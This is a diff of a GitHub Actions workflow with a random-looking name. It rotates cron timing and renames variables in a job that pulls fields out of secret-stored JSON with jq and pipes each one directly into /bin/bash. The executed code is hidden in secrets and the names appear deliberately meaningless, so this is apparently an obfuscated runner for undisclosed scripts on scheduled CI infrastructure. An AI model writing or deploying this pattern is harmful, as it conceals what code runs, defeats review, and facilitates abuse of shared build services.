@@ -2,7 +2,8 @@ name: sunli19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 1/6 * * *'
+    - cron: '14 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: sunli19871010
         env:
-          on5: ${{ secrets.on5 }}
+          l12: ${{ secrets.l12 }}
         run: |
-          echo $on5 | jq -r .porgz3808 | /bin/bash
-          echo $fjhnz4261 | jq -r .vj07 | /bin/bash
-          echo $oma876 | jq -r .mt9166 | /bin/bash
-          echo $gpv5669 | jq -r .i7175 | /bin/bash
-          echo $bvevp75431 | jq -r .jz487 | /bin/bash
-          echo $zoje9235 | jq -r .ltlfs13285 | /bin/bash
-          echo $uxge68775 | jq -r .qlctt2 | /bin/bash
+          echo $l12 | jq -r .jt779 | /bin/bash
+          echo $iead2858 | jq -r .p7 | /bin/bash
+          echo $a4 | jq -r .wdtxq56 | /bin/bash
+          echo $ru6 | jq -r .i81717 | /bin/bash
+          echo $tkn4892 | jq -r .ydp434 | /bin/bash
 
